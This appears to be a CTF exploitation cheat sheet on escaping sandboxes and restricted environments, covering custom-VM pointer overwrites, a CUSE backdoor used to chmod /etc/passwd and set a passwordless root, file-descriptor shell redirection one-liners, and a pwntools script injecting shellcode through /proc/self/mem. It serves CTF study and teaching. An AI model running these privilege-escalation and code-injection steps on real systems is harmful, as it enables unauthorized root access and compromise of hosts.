# CTF Pwn - Sandbox Escape and Restricted Environments

## Table of Contents
- [Python Sandbox Escape](#python-sandbox-escape)
- [VM Exploitation (Custom Bytecode)](#vm-exploitation-custom-bytecode)
- [FUSE/CUSE Character Device Exploitation](#fusecuse-character-device-exploitation)
- [Busybox/Restricted Shell Escalation](#busyboxrestricted-shell-escalation)
- [Shell Tricks](#shell-tricks)
- [Write-Anywhere via /proc/self/mem (BSidesSF 2025)](#write-anywhere-via-procselfmem-bsidessf-2025)

---

## Python Sandbox Escape

Python jail/sandbox escape techniques (AST bypass, audit hook bypass, MRO-based builtin recovery, decorator chains, restricted charset tricks, and more) are covered comprehensively in [ctf-misc/pyjails.md](../ctf-misc/pyjails.md).

## VM Exploitation (Custom Bytecode)

**Pattern (TerViMator, Pragyan 2026):** Custom VM with registers, opcodes, syscalls. Full RELRO + NX + PIE.

**Common vulnerabilities in VM syscalls:**
- **OOB read/write:** `inspect(obj, offset)` and `write_byte(obj, offset, val)` without bounds checking allows read/modify object struct data beyond allocated buffer
- **Struct overflow via name:** `name(obj, length)` writing directly to object struct allows overflowing into adjacent struct fields

**Exploitation pattern:**
1. Allocate two objects (data + exec)
2. Use OOB `inspect` to read exec object's XOR-encoded function pointer to leak PIE base
3. Use `name` overflow to rewrite exec object's pointer with `win() ^ KEY`
4. `execute(obj)` decodes and calls the patched function pointer

## FUSE/CUSE Character Device Exploitation

**FUSE** (Filesystem in Userspace) / **CUSE** (Character device in Userspace)

**Identification:**
- Look for `cuse_lowlevel_main()` or `fuse_main()` calls
- Device operations struct with `open`, `read`, `write` handlers
- Device name registered via `DEVNAME=backdoor` or similar

**Common vulnerability patterns:**
```c
// Backdoor pattern: write handler with command parsing
void backdoor_write(const char *input, size_t len) {
    char *cmd = strtok(input, ":");
    char *file = strtok(NULL, ":");
    char *mode = strtok(NULL, ":");
    if (!strcmp(cmd, "b4ckd00r")) {
        chmod(file, atoi(mode));  // Arbitrary chmod!
    }
}
```

**Exploitation:**
```bash
# Change /etc/passwd permissions via custom device
echo "b4ckd00r:/etc/passwd:511" > /dev/backdoor

# 511 decimal = 0777 octal (rwx for all)
# Now modify passwd to get root
echo "root::0:0:root:/root:/bin/sh" > /etc/passwd
su root
```

**Privilege escalation via passwd modification:**
1. Make `/etc/passwd` writable via the backdoor
2. Replace root line with `root::0:0:root:/root:/bin/sh` (no password)
3. `su root` without password prompt

## Busybox/Restricted Shell Escalation

When in restricted environment without sudo:
1. Find writable paths via character devices
2. Target system files: `/etc/passwd`, `/etc/shadow`, `/etc/sudoers`
3. Modify permissions then content to gain root

## Shell Tricks

**File descriptor redirection (no reverse shell needed):**
```bash
# Redirect stdin/stdout to client socket (fd 3 common for network)
exec <&3; sh >&3 2>&3

# Or as single command string
exec<&3;sh>&3
```
- Network servers often have client connection on fd 3
- Avoids firewall issues with outbound connections
- Works when you have command exec but limited chars

**Find correct fd:**
```bash
ls -la /proc/self/fd           # List open file descriptors
```

**Short shellcode alternatives:**
- `sh<&3 >&3` - minimal shell redirect
- Use `$0` instead of `sh` in some shells

---

## Write-Anywhere via /proc/self/mem (BSidesSF 2025)

When a service allows writing to arbitrary files at arbitrary offsets, target `/proc/self/mem` for code injection:

```python
from pwn import *

# Service API: send filename, offset, content
def write_mem(r, offset, data):
    r.sendline(b'/proc/self/mem')
    r.sendline(str(offset).encode())
    r.sendline(data)

# 1. Leak a return address from the stack (or use known binary address)
# 2. Write shellcode to a writable+executable region (or reuse existing code)
# 3. Overwrite return address to point to shellcode

shellcode = asm(shellcraft.sh())

r = remote(host, port)
# Overwrite code at known address (e.g., after close@plt returns)
write_mem(r, target_code_addr, shellcode)
```

**Key insight:** `/proc/self/mem` provides random-access read/write to the process's virtual memory, bypassing page protections that mmap enforces. Writing to text segments (code) works even when the segment is mapped read-only via normal mmap -- the kernel performs the write through the page tables directly. This makes it equivalent to a debugger `PTRACE_POKETEXT`.

**Requirements:** File write primitive must handle binary data (null bytes). The target offset must be a valid mapped virtual address.
